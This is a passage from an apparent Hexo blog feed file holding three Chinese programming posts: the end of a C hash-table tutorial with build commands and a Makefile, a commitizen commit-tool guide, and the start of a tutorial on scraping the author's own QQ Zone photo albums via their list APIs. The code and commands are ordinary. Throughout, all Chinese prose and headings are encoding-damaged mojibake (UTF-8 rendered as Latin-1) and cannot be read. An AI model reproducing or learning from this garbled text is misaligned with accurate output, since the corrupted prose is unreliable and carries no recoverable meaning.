        else if (!strcmp(action, &quot;show&quot;))
            show();
        else if (!strcmp(action, &quot;commit&quot;))
            commit();
        else if (!strcmp(action, &quot;help&quot;))
            help();
        else if (!strcmp(action, &quot;exit&quot;)) {
            commit();
            break;
        }
        else {
            __nprintf(&quot;unknown cmd, try help!&quot;);
            continue;
        }
    }
}
</code></pre>
<p>ç¼–è¯‘ååº”ç”¨ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<pre><code class="bash">âœ  hash git:(master) ./hash
CMD&gt; help
  help          --show this infomation
  set key val   --set or update value of key
  unset key     --remove key from hash table
  get key       --show value of key
  show          --show all keys &amp; values of hash table
  commit        --write all keys &amp; values to local file
  exit          --exit current session
CMD&gt; set id 1234
CMD&gt; show
---------------------------------------
22      id=&quot;1234&quot;
---------------------------------------
CMD&gt; get id
id=&quot;1234&quot;
CMD&gt;
CMD&gt; set username litreily
CMD&gt; set password 123456
CMD&gt; show
---------------------------------------
22      id=&quot;1234&quot;
79      password=&quot;123456&quot;
88      username=&quot;litreily&quot;
---------------------------------------
CMD&gt; unset password
CMD&gt; show
---------------------------------------
22      id=&quot;1234&quot;
88      username=&quot;litreily&quot;
---------------------------------------
CMD&gt; commit
CMD&gt; exit
âœ  hash git:(master)
</code></pre>
<h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><p>é™¤äº†äº¤äº’å¼ç¨‹åº<code>hash</code>å¤–ï¼Œæˆ‘è¿˜å†™äº†ä¸€ä¸ªæµ‹è¯•ç”¨ä¾‹ï¼Œç”¨äºç”Ÿæˆ100ç»„éšæœºé”®å€¼å¯¹ï¼Œé”®å€¼å¯¹ç”±éšæœºé•¿åº¦åŠå­—ç¬¦ç»„æˆï¼Œæœ€ç»ˆå¾—åˆ°çš„å“ˆå¸Œè¡¨å°†å­˜å…¥æœ¬åœ°æ–‡ä»¶<code>data.txt</code>ä¸­ã€‚</p>
<pre><code class="c">#include &lt;time.h&gt;
#include &quot;hash.h&quot;

#define MAX_KEYS 1024
static const char * key_pool = &quot;abcdefghijklmnopqrstuvwxyz_&quot;;
static const char * val_pool = &quot;abcdefghijklmnopqrstuvwxyz_0123456789 .&quot;;

void set_rand_key() {
    int key_maxlen = strlen(key_pool);
    int val_maxlen = strlen(val_pool);
    char key[32] = {0};
    char val[128] = {0};
    int key_len, val_len, i;

    key_len = 1 + rand() % 16;
    val_len = 4 + rand() % 50;

    for(i = 0; i &lt; key_len; i++)
        key[i] = key_pool[rand() % key_maxlen];

    for(i = 0; i &lt; val_len; i++)
        val[i] = val_pool[rand() % val_maxlen];

    set(key, val);
}

int main(int argc, char *argv[]) {
    int i;
    int test_times = argc &gt; 1? atoi(argv[1]) : MAX_KEYS;

    srand((uint32_t)time(NULL));
    for(i = 0; i &lt; test_times; i++)
        set_rand_key();
    commit();

    show();

    return 0;
}
</code></pre>
<p>è¯¥æµ‹è¯•ç”¨ä¾‹ä¹Ÿå¯ä»¥å¤§è‡´ç”¨æ¥æµ‹è¯•å“ˆå¸Œå‡½æ•°çš„å¯é æ€§ï¼Œåªè¦çœ‹æ•°æ®ä¸­æ¯ä¸ªé”®å€¼å¯¹å‰é¢çš„å“ˆå¸Œå€¼æ˜¯å¦å‡åŒ€åˆ†å¸ƒå³å¯ï¼Œå®è·µè¯æ˜æ˜¯å‡åŒ€åˆ†å¸ƒçš„ï¼Œè¿™é‡Œä¸å†ç»™å‡ºæµ‹è¯•è¿‡ç¨‹ã€‚</p>
<h3 id="libhash-so"><a href="#libhash-so" class="headerlink" title="libhash.so"></a>libhash.so</h3><p>åœ¨å¤ä¹ å“ˆå¸Œå‡½æ•°çš„åŒæ—¶ï¼Œé¡ºä¾¿å¤ä¹ äº†ä¸‹åŠ¨æ€é“¾æ¥åº“çš„ç”Ÿæˆå’Œä½¿ç”¨ï¼Œè¦æŠŠ<code>hash.c</code>ç¼–è¯‘æˆé“¾æ¥åº“<code>libhash.so</code>ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ç¼–è¯‘è¯­å¥</p>
<pre><code class="bash">gcc -fPIC -c hash.c
gcc -shared -o libhash.so hash.o
</code></pre>
<p>å…¶ä¸­çš„<code>shared</code>ç”¨äºæŒ‡å®šç”ŸæˆåŠ¨æ€é“¾æ¥åº“ã€‚</p>
<p>åœ¨ä½¿ç”¨åŠ¨æ€é“¾æ¥åº“æ—¶ï¼Œéœ€è¦è®©ä½¿ç”¨åº“æ–‡ä»¶çš„ç¨‹åºè®¿é—®è¯¥åº“ï¼Œæœ‰ä»¥ä¸‹æ–¹æ³•ï¼š</p>
<ol>
<li>å°†åŠ¨æ€é“¾æ¥åº“æ‹·è´åˆ°ç³»ç»Ÿç¯å¢ƒå˜é‡åŒ…å«çš„è·¯å¾„ä¸­ï¼Œå¦‚<code>/usr/lib</code></li>
<li>å°†åŠ¨æ€é“¾æ¥åº“æ‰€åœ¨è·¯å¾„æ·»åŠ åˆ°ç¯å¢ƒå˜é‡</li>
<li>ä¿®æ”¹å˜é‡<code>LD_LIBRARY_PATH</code>,å°†åŠ¨æ€é“¾æ¥åº“çš„è·¯å¾„æ·»åŠ å…¶ä¸­</li>
</ol>
<p>ä¸‹é¢ä¸¾ä¸€ä¸ªå¾ˆç®€å•çš„ä¾‹å­,<code>demo.c</code></p>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;

extern void __nprintf(const char *fmt, ...);
extern uint32_t hash(char *key);
extern char* get(char *key);
extern int set(char *key, char *val);
extern int unset(char *key);
extern int commit();
extern int load();
extern void show();

int main(int argc, char *argv[]) {
    __nprintf(&quot;start&quot;);
    load();
    show();
    __nprintf(&quot;end&quot;);
    return 0;
}
</code></pre>
<p>ä»£ç å¾ˆç®€å•ï¼Œå°±æ˜¯å®Œæˆå“ˆå¸Œè¡¨çš„å¯¼å…¥ä¸æ˜¾ç¤ºï¼Œç¼–è¯‘è¯­å¥å¦‚ä¸‹ï¼š</p>
<pre><code class="bash">gcc -fPIC demo.c -o demo -L. -lhash
</code></pre>
<p>å…¶ä¸­ï¼Œ<code>-L.</code>ä»£è¡¨ä»å½“å‰ç›®å½•å¯»æ‰¾é“¾æ¥åº“ï¼Œ<code>-lhash</code>ä»£è¡¨é“¾æ¥åˆ°åº“<code>libhash.so</code>,æ³¨æ„å‰ç¼€<code>lib</code>åŠåç¼€<code>.so</code>æ˜¯è‡ªåŠ¨æ·»åŠ çš„ï¼Œç¼–è¯‘è¯­å¥ä¸­æ— éœ€æ·»åŠ ã€‚</p>
<h3 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h3><p>å¦‚æœå°†ä»¥ä¸Šæ‰€æœ‰ç¨‹åºä¸€èµ·ç¼–è¯‘ï¼Œå°±éœ€è¦ç¼–å†™<code>Makefile</code>å¦‚ä¸‹</p>
<pre><code class="Makefile">.PHONY: all clean

all: hash test libhash.so demo

CC=gcc
CFLAGS=-fPIC

%.o: %.c
    $(CC) $(CFLAGS) -c $&lt;

hash: main.o hash.o
    $(CC) -o $@ $^

test: test.o hash.o
    $(CC) -o $@ $^

libhash.so: hash.o
    $(CC) -shared -o $@ $^

demo: demo.o
    $(CC) $^ -o $@ -L. -lhash

clean:
    rm -rf *.o hash test libhash.so demo
</code></pre>
<h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬æ–‡ä¸»è¦è®²è¿°äº†å“ˆå¸Œè¡¨çš„ç®€å•å®ç°æ–¹æ³•åŠå…¶å¸¸è§æ“ä½œï¼Œç„¶åé€šè¿‡å‡ ä¸ªç®€å•ä¾‹å­è¯´æ˜äº†ä½¿ç”¨æ–¹æ³•ï¼Œæœ€åé¡ºé“è¯´äº†ä¸€ä¸‹åŠ¨æ€é“¾æ¥åº“çš„ç”ŸæˆåŠä½¿ç”¨æ–¹æ³•ã€‚</p>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> linux </tag>
            
            <tag> C/C++ </tag>
            
            <tag> hash </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[git commit å·¥å…· - commitizen]]></title>
      <url>https://www.litreily.top/2019/03/12/commitizen/</url>
      <content type="html"><![CDATA[<p>ä¸ºäº†è§„èŒƒä»£ç æäº¤ï¼Œæœ€è¿‘å­¦ä¹ äº†ä¸€ä¸‹å¦‚ä½•ä½¿ç”¨<code>commitizen</code>è¿›è¡Œcommitæäº¤ï¼Œå…¶å®ä¹Ÿå¾ˆç®€å•ï¼Œè¿™é‡Œç®€å•åšä¸ªä»‹ç»ã€‚</p>
<h2 id="commitizen-å®‰è£…"><a href="#commitizen-å®‰è£…" class="headerlink" title="commitizen å®‰è£…"></a>commitizen å®‰è£…</h2><pre><code class="bash">npm install -g commitizen
</code></pre>
<a id="more"></a>
<h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p>å¯¹äºå¹¶éä½¿ç”¨<code>nodejs</code>çš„é¡¹ç›®ï¼Œè¦å…ˆé€šè¿‡</p>
<pre><code class="sh">npm init --yes
</code></pre>
<p>å®Œæˆåˆå§‹åŒ–ï¼Œç„¶åé€šè¿‡</p>
<pre><code class="sh">commitizen init cz-conventional-changelog --save --save-exact
</code></pre>
<p>å¯ç”¨<code>commitizen</code>åŠŸèƒ½ï¼Œæ­¤åä½¿ç”¨<code>git cz</code>æ›¿æ¢<code>git commit</code>å³å¯ã€‚å½“ç„¶ä¸ºäº†æ–¹ä¾¿å¯ä»¥åœ¨<code>.bashrc</code>æˆ–<code>.zshrc</code>ä¸­æ·»åŠ ä¸€ä¸ªåˆ«åã€‚</p>
<pre><code class="sh">alias cz=&quot;commitizen init cz-conventional-changelog --save --save-exact&quot;
</code></pre>
<p>ç„¶å<code>source ~/.bashrc</code> or <code>source ~/.zshrc</code> å³å¯ã€‚å¥½äº†ï¼Œä¸‹é¢æ˜¯æˆ‘çš„ç¬”è®°åº“çš„åº”ç”¨å®ä¾‹ã€‚</p>
<pre><code class="bash">âœ  Notes git:(master) âœ— npm init --yes
âœ  Notes git:(master) âœ— commitizen init cz-conventional-changelog --save --save-exact
âœ  Notes git:(master) âœ— git cz
cz-cli@3.0.7, cz-conventional-changelog@2.1.0


Line 1 will be cropped at 100 characters. All other lines will be wrapped after 100 characters.

? Select the type of change that you&#39;re committing:
  chore:    Other changes that don&#39;t modify src or test files
  revert:   Reverts a previous commit
  feat:     A new feature
â¯ fix:      A bug fix
  docs:     Documentation only changes
  style:    Changes that do not affect the meaning of the code (white-space, formatting, missing semi-colons, etc)
  refactor: A code change that neither fixes a bug nor adds a feature
(Move up and down to reveal more choices)
</code></pre>
<p>ç›®å‰è¯¥å·¥å…·æ”¯æŒä»¥ä¸‹å‡ ç§æäº¤ç±»å‹ï¼š</p>
<table>
<thead>
<tr>
<th style="text-align:center"><code>type</code></th>
<th style="text-align:left"><code>description</code></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">feat</td>
<td style="text-align:left">A new feature</td>
</tr>
<tr>
<td style="text-align:center">fix</td>
<td style="text-align:left">A bug fix</td>
</tr>
<tr>
<td style="text-align:center">docs</td>
<td style="text-align:left">Documentation only changes</td>
</tr>
<tr>
<td style="text-align:center">style</td>
<td style="text-align:left">Changes that do not affect the meaning of the code</td>
</tr>
<tr>
<td style="text-align:center">refactor</td>
<td style="text-align:left">A code change that neither fixes a bug nor adds a feature</td>
</tr>
<tr>
<td style="text-align:center">perf</td>
<td style="text-align:left">A code change that improves performance</td>
</tr>
<tr>
<td style="text-align:center">test</td>
<td style="text-align:left">Adding missing tests or correcting existing tests</td>
</tr>
<tr>
<td style="text-align:center">build</td>
<td style="text-align:left">Changes that affect the build system or external dependencies</td>
</tr>
<tr>
<td style="text-align:center">ci</td>
<td style="text-align:left">Changes to our CI configuration files and scripts</td>
</tr>
<tr>
<td style="text-align:center">chore</td>
<td style="text-align:left">Other changes that don&#39;t modify src or test files</td>
</tr>
<tr>
<td style="text-align:center">revert</td>
<td style="text-align:left">Reverts a previous commit</td>
</tr>
</tbody>
</table>
<p>ä¸‹é¢æ˜¯æ·»åŠ commitçš„è¿‡ç¨‹</p>
<pre><code class="bash">âœ  Notes git:(master) âœ— git cz
cz-cli@3.0.7, cz-conventional-changelog@2.1.0


Line 1 will be cropped at 100 characters. All other lines will be wrapped after 100 characters.

? Select the type of change that you&#39;re committing: docs:     Documentation only changes
? What is the scope of this change (e.g. component or file name)? (press enter to skip)

? Write a short, imperative tense description of the change:
 update docs about git stash
? Provide a longer description of the change: (press enter to skip)

? Are there any breaking changes? No
? Does this change affect any open issues? No
[master d82e0e9] docs: update docs about git stash
 2 files changed, 19 insertions(+)
âœ  Notes git:(master)
</code></pre>
<p>æäº¤è¿‡ç¨‹ä¼šé€æ­¥æç¤ºä½ æ·»åŠ ç›¸åº”çš„å†…å®¹ï¼Œä¸æ·»åŠ çš„ç›´æ¥å›è½¦è·³è¿‡å³å¯ã€‚å¤§éƒ¨åˆ†æƒ…å†µåªè¦é€‰æ‹©<code>type</code>ä»¥åŠæè¿°ä¿¡æ¯ã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="http://www.ruanyifeng.com/blog/2016/01/commit_message_change_log.html" target="_blank" rel="noopener">Commit message å’Œ Change log ç¼–å†™æŒ‡å—</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Tools </category>
            
        </categories>
        
        
        <tags>
            
            <tag> git </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Pythonç½‘ç»œçˆ¬è™«5 - çˆ¬å–QQç©ºé—´ç›¸å†Œ]]></title>
      <url>https://www.litreily.top/2019/03/03/qqzone/</url>
      <content type="html"><![CDATA[<p>è‡ªæ¯•ä¸šåï¼Œå°±å†ä¹Ÿæ²¡æœ‰ç”¨è¿‡QQï¼ŒQQç©ºé—´é‡Œè®°å½•çš„æ˜¯äº›å¹¶ä¸ç²¾å½©çš„é’è‘±å²æœˆï¼Œä½†å¥½æ­¹ä¹Ÿæ˜¯ä»½å›å¿†ï¼Œè¿‘æ—¥æƒ³ç€å­¦ä»¥è‡´ç”¨ï¼Œç”¨<code>Python</code>æŠŠQQç©ºé—´ç›¸å†Œçš„æ‰€æœ‰ç…§ç‰‡çˆ¬å–ä¸‹æ¥ï¼Œä»¥ä½œå¤‡ä»½ã€‚</p>
<h2 id="åˆ†æQQç©ºé—´"><a href="#åˆ†æQQç©ºé—´" class="headerlink" title="åˆ†æQQç©ºé—´"></a>åˆ†æQQç©ºé—´</h2><h3 id="ç™»å½•QQç©ºé—´"><a href="#ç™»å½•QQç©ºé—´" class="headerlink" title="ç™»å½•QQç©ºé—´"></a>ç™»å½•QQç©ºé—´</h3><p>çˆ¬å–ç¬¬ä¸€æ­¥ï¼Œåˆ†æç«™ç‚¹ï¼Œé¦–å…ˆéœ€è¦çŸ¥é“å¦‚ä½•ç™»å½•QQç©ºé—´ã€‚æœ€åˆæƒ³æ³•æ˜¯ç”¨<code>requests</code>åº“é…ç½®ç™»å½•è¯·æ±‚ï¼Œæ¨¡æ‹Ÿç™»å½•ï¼Œä½†æ˜¯ä¸ä¹…ä¾¿æ”¾å¼ƒäº†è¿™ä¸€æ€è·¯ï¼Œè¯·çœ‹ä¸‹å›¾â†“</p>
<p><img src="/assets/qqzone/login.png" alt="login"></p>
<p>æ ¹æ®ç™»å½•æŒ‰é’®ç»‘å®šçš„ç›‘å¬äº‹ä»¶å¯ä»¥è¿½è¸ªåˆ°è¯¥æŒ‰é’®çš„ç‚¹å‡»äº‹ä»¶å¦‚ä¸‹ï¼š</p>
<p><img src="/assets/qqzone/login_func.png" alt="login function"></p>
<p>è´¦å·åŠ å¯†æ˜¯å¿…ç„¶çš„ï¼Œä½†è¿™ä¸€å †å †çš„ä»£ç çœŸå¿ƒä¸å¥½è§£æï¼Œæœ‰è€å¿ƒçš„å‹‡å£«å°½æƒ…ä¸€è¯•ï¼</p>
<p>åœ¨æ’é™¤è¿™ç§ç™»å½•æ–¹æ³•åï¼Œé€‰æ‹©<code>selenium</code>æ¨¡æ‹Ÿç”¨æˆ·ç™»å½•ä¸å¤±ä¸ºçœæ—¶çœåŠ›çš„æ–¹æ³•ï¼Œè€Œä¸”æˆ‘ä»¬åªæ˜¯éœ€è¦é€šè¿‡<code>selenium</code>å®Œæˆç™»å½•ï¼Œè·å–åˆ°<code>Cookies</code>å’Œåé¢è®²è¿°çš„<code>g_tk</code>å‚æ•°åï¼Œå°±å¯ä»¥åœç”¨äº†ï¼Œæ‰€ä»¥æ•ˆç‡å¹¶ä¸å¤ªä½ã€‚</p>
<h3 id="åˆ†æç©ºé—´ç›¸å†Œ"><a href="#åˆ†æç©ºé—´ç›¸å†Œ" class="headerlink" title="åˆ†æç©ºé—´ç›¸å†Œ"></a>åˆ†æç©ºé—´ç›¸å†Œ</h3><p>ç™»å½•ä»¥åï¼Œé¡µé¢ä¼šè·³è½¬è‡³ <a href="javascript:;" target="_blank" rel="noopener">https://user.qzone.qq.com/{QQ_NUMBER}</a>, è¿™æ—¶æŠŠé¼ æ ‡ç§»åˆ°å¯¼èˆªæ ä½ ä¼šå‘ç°ï¼Œæ‰€æœ‰çš„å¯¼èˆªæ é“¾æ¥éƒ½æ˜¯<code>javascript:;</code> ğŸ˜³ã€‚æ²¡é”™å°±æ˜¯è¿™ä¹ˆå‘ï¼Œä¸€åˆ‡éƒ½æ˜¯æš—ç®±æ“ä½œã€‚</p>
<p>å½“ç„¶è¿™å¹¶ä¸éš¾å¤„ç†ï¼Œä½¿ç”¨è°ƒè¯•å·¥å…·æ•è·ç‚¹å‡»åäº§ç”Ÿçš„è¯·æ±‚ï¼Œç„¶åè¿‡æ»¤å‡ºæ­£ç¡®çš„è¯·æ±‚åŒ…å³å¯ã€‚å› ä¸ºç½‘ç»œåŒ…éå¸¸å¤šï¼Œé‚£ä¹ˆæ€ä¹ˆè¿‡æ»¤å‘¢ï¼ŒçŒœæƒ³ç›¸å†Œæ•°æ®çš„APIå¿…ç„¶ä¼šè¿”å›ä¸ªåˆ—è¡¨<code>list</code>ï¼Œå°è¯•è¿‡æ»¤<code>list</code>ç„¶åé€ä¸ªæ’é™¤ï¼Œæœ€åå®šä½åˆ°è¯·æ±‚åŒ…ã€‚ä¸‹é¢æ˜¯é€šè¿‡<code>fcg_list</code>è¿‡æ»¤åçš„æ•°æ®åŒ…ï¼Œåˆ—è¡¨ä¿¡æ¯ä»¥<code>jsonp</code>æ ¼å¼è¿”å›ï¼Œç¨ä½œå¤„ç†å³å¯å½“åš<code>json</code>æ ¼å¼æ¥è¯»å–ï¼ˆåé¢æœ‰è®²ï¼‰ã€‚</p>
<p><img src="/assets/qqzone/album_list.png" alt="album list"></p>
<p>ä»<code>Headers</code>å’Œ<code>Response</code>å¯ä»¥åˆ†åˆ«è·å–åˆ°ä¸¤ç»„<strong>é‡è¦</strong>ä¿¡æ¯ï¼š</p>
<ol>
<li><code>request</code> è·å–ç›¸å†Œåˆ—è¡¨æ‰€éœ€çš„è¯·æ±‚ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¯·æ±‚é“¾æ¥å’Œå‚æ•°</li>
<li><code>response</code> æ•°æ®åŒ…åŒ…å«çš„æ‰€æœ‰ç›¸å†Œçš„ä¿¡æ¯ï¼Œæ˜¯æ¯ä¸ªç›¸å†Œæ‰€å«ç…§ç‰‡å¯¹åº”çš„è¯·æ±‚åŒ…å‚æ•°çš„æ•°æ®æ¥æº</li>
</ol>
<p>å…ˆçœ‹è¯·æ±‚åŒ…ï¼š</p>
<pre><code class="yml"># url
https://h5.qzone.qq.com/proxy/domain/photo.qzone.qq.com/fcgi-bin/fcg_list_album_v3

# args
g_tk: 477819917
callback: shine0_Callback
t: 691481346
hostUin: 123456789
uin: 123456789
appid: 4
inCharset: utf-8
outCharset: utf-8
source: qzone
plat: qzone
format: jsonp
notice: 0
filter: 1
handset: 4
pageNumModeSort: 40
pageNumModeClass: 15
needUserInfo: 1
idcNum: 4
callbackFun: shine0
_: 1551788226819
</code></pre>
<p>å…¶ä¸­<code>hostUin</code>, <code>uin</code>éƒ½æ˜¯QQå·ï¼Œ<code>g_tk</code>æ˜¯å¿…é¡»çš„ä¸”æ¯æ¬¡é‡æ–°ç™»å½•éƒ½ä¼šæ›´æ–°ï¼ˆåé¢æœ‰è®²å¦‚ä½•è·å–ï¼‰ï¼Œå…¶å®ƒæœ‰äº›å‚æ•°ä¸æ˜¯å¿…é¡»çš„ï¼Œæˆ‘å°è¯•åæ•´ç†å‡ºå¦‚ä¸‹è¯·æ±‚å‚æ•°ï¼š</p>
<pre><code class="python">query = {
    &#39;g_tk&#39;: self.g_tk,
    &#39;hostUin&#39;: self.username,
    &#39;uin&#39;: self.username,
    &#39;appid&#39;: 4,
    &#39;inCharset&#39;: &#39;utf-8&#39;,
    &#39;outCharset&#39;: &#39;utf-8&#39;,
    &#39;source&#39;: &#39;qzone&#39;,
    &#39;plat&#39;: &#39;qzone&#39;,
    &#39;format&#39;: &#39;jsonp&#39;
}
</code></pre>
<p>æ¥ä¸‹æ¥çœ‹<code>jsonp</code>æ ¼å¼çš„è·¨åŸŸå“åº”åŒ…ï¼š</p>
<pre><code class="json">shine0_Callback({
    &quot;code&quot;:0,
    &quot;subcode&quot;:0,
    &quot;message&quot;:&quot;&quot;,
    &quot;default&quot;:0,
    &quot;data&quot;:
{
   &quot;albumListModeSort&quot; : [
      {
         &quot;allowAccess&quot; : 1,
         &quot;anonymity&quot; : 0,
         &quot;bitmap&quot; : &quot;10000000&quot;,
         &quot;classid&quot; : 106,
         &quot;comment&quot; : 11,
         &quot;createtime&quot; : 1402661881,
         &quot;desc&quot; : &quot;&quot;,
         &quot;handset&quot; : 0,
         &quot;id&quot; : &quot;V13LmPKk0JLNRY&quot;,
         &quot;lastuploadtime&quot; : 1402662103,
         &quot;modifytime&quot; : 1408271987,
         &quot;name&quot; : &quot;æ¯•ä¸šå­£&quot;,
         &quot;order&quot; : 0,
         &quot;pre&quot; : &quot;http:\/\/b171.photo.store.qq.com\/psb?\/V13LmPKk0JLNRY\/eSAslg*mYWaytEtLysg*Q*5Km91gIWfGuwSk58K2rQY!\/a\/dIY29GUbJgAA&quot;,
         &quot;priv&quot; : 1,
         &quot;pypriv&quot; : 1,
         &quot;total&quot; : 4,
         &quot;viewtype&quot; : 0
      },
</code></pre>
<p>shine0_Callbackæ˜¯è¯·æ±‚åŒ…çš„<code>callbackFun</code>å‚æ•°å†³å®šçš„ï¼Œå¦‚æœæ²¡è¿™ä¸ªå‚æ•°ï¼Œå“åº”åŒ…ä¼šä»¥<code>_Callback</code>ä½œä¸ºé»˜è®¤åï¼Œå½“ç„¶è¿™éƒ½ä¸é‡è¦ã€‚æ‰€æœ‰ç›¸å†Œä¿¡æ¯ä»¥<code>json</code>æ ¼å¼å­˜å…¥<code>albumListModeSort</code>ä¸­ï¼Œä¸Šé¢ä»…æˆªå–äº†ä¸€ä¸ªç›¸å†Œçš„ä¿¡æ¯ã€‚</p>
<p>ç›¸å†Œä¿¡æ¯ä¸­ï¼Œ<code>name</code>ä»£è¡¨ç›¸å†Œåç§°ï¼Œ<code>id</code>ä½œä¸ºå”¯ä¸€æ ‡è¯†å¯ç”¨äºè¯·æ±‚è¯¥ç›¸å†Œå†…çš„ç…§ç‰‡ä¿¡æ¯ï¼Œè€Œ<code>pre</code>ä»…ä»…æ˜¯ä¸€ä¸ªé¢„è§ˆç¼©ç•¥å›¾çš„é“¾æ¥ï¼Œæ— å…³ç´§è¦ã€‚</p>
<h3 id="åˆ†æå•ä¸ªç›¸å†Œ"><a href="#åˆ†æå•ä¸ªç›¸å†Œ" class="headerlink" title="åˆ†æå•ä¸ªç›¸å†Œ"></a>åˆ†æå•ä¸ªç›¸å†Œ</h3><p>ä¸è·å–ç›¸å†Œä¿¡æ¯ç±»ä¼¼ï¼Œè¿›å…¥æŸä¸€ç›¸å†Œï¼Œä½¿ç”¨<code>cgi_list</code>è¿‡æ»¤æ•°æ®åŒ…ï¼Œæ‰¾åˆ°è¯¥ç›¸å†Œçš„ç…§ç‰‡ä¿¡æ¯</p>
<p><img src="/assets/qqzone/photo_list.png" alt="photo list"></p>
<p>åŒæ ·çš„é“ç†ï¼Œæ ¹æ®æ•°æ®åŒ…å¯ä»¥è·å–ç…§ç‰‡åˆ—è¡¨ä¿¡æ¯çš„è¯·æ±‚åŒ…å’Œå“åº”ä¿¡æ¯ï¼Œå…ˆçœ‹è¯·æ±‚ï¼š</p>
<pre><code class="yml"># url
https://h5.qzone.qq.com/proxy/domain/photo.qzone.qq.com/fcgi-bin/cgi_list_photo

# args
g_tk: 477819917
callback: shine0_Callback
t: 952444063
mode: 0
idcNum: 4
hostUin: 123456789
topicId: V13LmPKk0JLNRY
noTopic: 0
uin: 123456789
pageStart: 0
pageNum: 30
skipCmtCount: 0
singleurl: 1
batchId:
notice: 0
appid: 4
inCharset: utf-8
outCharset: utf-8
source: qzone
plat: qzone
outstyle: json
format: jsonp
json_esc: 1
question:
answer:
callbackFun: shine0
_: 1551790719497
</code></pre>
<p>å…¶ä¸­æœ‰å‡ ä¸ªå…³é”®å‚æ•°ï¼š</p>
<ol>
<li><code>g_tk</code> - ä¸ç›¸å†Œåˆ—è¡¨å‚æ•°ä¸€è‡´</li>
<li><code>topicId</code> - ä¸ç›¸å†Œåˆ—è¡¨å‚æ•°ä¸­çš„<code>id</code>ä¸€è‡´</li>
<li><code>pageStart</code> - æœ¬æ¬¡è¯·æ±‚ç…§ç‰‡çš„èµ·å§‹ç¼–å·</li>
<li><code>pageNum</code> - æœ¬æ¬¡è¯·æ±‚çš„ç…§ç‰‡æ•°é‡</li>
</ol>
<blockquote>
<p>ä¸ºäº†ä¸€æ¬¡æ€§è·å–æ‰€æœ‰ç…§ç‰‡ï¼Œå¯ä»¥å°†<code>pageStart</code>è®¾ä¸º0ï¼Œ<code>pageNum</code>è®¾ä¸ºæ‰€æœ‰ç›¸å†Œæ‰€å«ç…§ç‰‡çš„æœ€å¤§å€¼ã€‚</p>
</blockquote>
<p>åŒæ ·å¯ä»¥å¯¹ä¸Šé¢çš„å‚æ•°è¿›è¡Œç®€åŒ–ï¼Œåœ¨ç›¸å†Œåˆ—è¡¨è¯·æ±‚å‚æ•°çš„åŸºç¡€ä¸Šæ·»åŠ <code>topicId</code>ï¼Œ<code>pageStart</code>å’Œ<code>pageNum</code>ä¸‰ä¸ªå‚æ•°å³å¯ã€‚</p>
<p>ä¸‹é¢æ¥çœ‹è¿”å›çš„ç…§ç‰‡åˆ—è¡¨ä¿¡æ¯ï¼š</p>
<pre><code class="json">shine0_Callback({
    &quot;code&quot;:0,
    &quot;subcode&quot;:0,
    &quot;message&quot;:&quot;&quot;,
    &quot;default&quot;:0,
    &quot;data&quot;:
{
   &quot;limit&quot; : 0,
   &quot;photoList&quot; : [
      {
         &quot;batchId&quot; : &quot;1402662093402000&quot;,
         &quot;browser&quot; : 0,
         &quot;cameratype&quot; : &quot; &quot;,
         &quot;cp_flag&quot; : false,
         &quot;cp_x&quot; : 455,
         &quot;cp_y&quot; : 388,
         &quot;desc&quot; : &quot;&quot;,
         &quot;exif&quot; : {
            &quot;exposureCompensation&quot; : &quot;&quot;,
            &quot;exposureMode&quot; : &quot;&quot;,
            &quot;exposureProgram&quot; : &quot;&quot;,
            &quot;exposureTime&quot; : &quot;&quot;,
            &quot;flash&quot; : &quot;&quot;,
            &quot;fnumber&quot; : &quot;&quot;,
            &quot;focalLength&quot; : &quot;&quot;,
            &quot;iso&quot; : &quot;&quot;,
            &quot;lensModel&quot; : &quot;&quot;,
            &quot;make&quot; : &quot;&quot;,
            &quot;meteringMode&quot; : &quot;&quot;,
            &quot;model&quot; : &quot;&quot;,
            &quot;originalTime&quot; : &quot;&quot;
         },
         &quot;forum&quot; : 0,
         &quot;frameno&quot; : 0,
         &quot;height&quot; : 621,
         &quot;id&quot; : 0,
         &quot;is_video&quot; : false,
         &quot;is_weixin_mode&quot; : 0,
         &quot;ismultiup&quot; : 0,
         &quot;lloc&quot; : &quot;NDN0sggyKs3smlOg6eYghjb0ZRsmAAA!&quot;,
         &quot;modifytime&quot; : 1402661792,
         &quot;name&quot; : &quot;QQå›¾ç‰‡20140612104616&quot;,
         &quot;origin&quot; : 0,
         &quot;origin_upload&quot; : 0,
         &quot;origin_url&quot; : &quot;&quot;,
         &quot;owner&quot; : &quot;123456789&quot;,
         &quot;ownername&quot; : &quot;123456789&quot;,
         &quot;photocubage&quot; : 91602,
         &quot;phototype&quot; : 1,
         &quot;picmark_flag&quot; : 0,
         &quot;picrefer&quot; : 1,
         &quot;platformId&quot; : 0,
         &quot;platformSubId&quot; : 0,
         &quot;poiName&quot; : &quot;&quot;,
         &quot;pre&quot; : &quot;http:\/\/b171.photo.store.qq.com\/psb?\/V13LmPKk0JLNRY\/eSAslg*mYWaytEtLysg*Q*5Km91gIWfSk58K2rQY!\/a\/dIY29GUbJgAA&amp;bo=pANtAgAAAAABCeY!&quot;,
         &quot;raw&quot; : &quot;http:\/\/r.photo.store.qq.com\/psb?\/V13LmPKk0JLNRY\/eSAslg*mYWaytEtLysg*Q*5Km91gIWfSk58K2rQY!\/r\/dIY29GUbJgAA&quot;,
         &quot;raw_upload&quot; : 1,
         &quot;rawshoottime&quot; : 0,
         &quot;shoottime&quot; : 0,
         &quot;shorturl&quot; : &quot;&quot;,
         &quot;sloc&quot; : &quot;NDN0sggyKs3smlOg6eYghjb0ZRsmAAA!&quot;,
